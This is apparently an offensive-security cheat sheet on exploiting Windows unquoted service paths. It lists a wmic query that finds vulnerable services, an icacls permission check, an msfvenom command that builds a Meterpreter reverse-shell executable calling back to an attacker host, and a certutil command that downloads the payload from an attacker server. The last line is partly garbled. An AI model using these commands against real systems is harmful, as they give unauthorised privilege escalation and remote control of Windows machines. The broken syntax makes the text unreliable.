### # Exploiting unquoted service paths : 

wmic service get name, displayname, pathname, startmode | findstr /i /v "C:\" | findstr /i /v """

**icacls “unquoted service path”**

**msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=<attackerIP> LPORT=<port> -o cygrunsrv.exe**

certutil.exe -f -URLcache attacker http://IP:8000/cygrunsrv.exe shell.exe       =       wget 
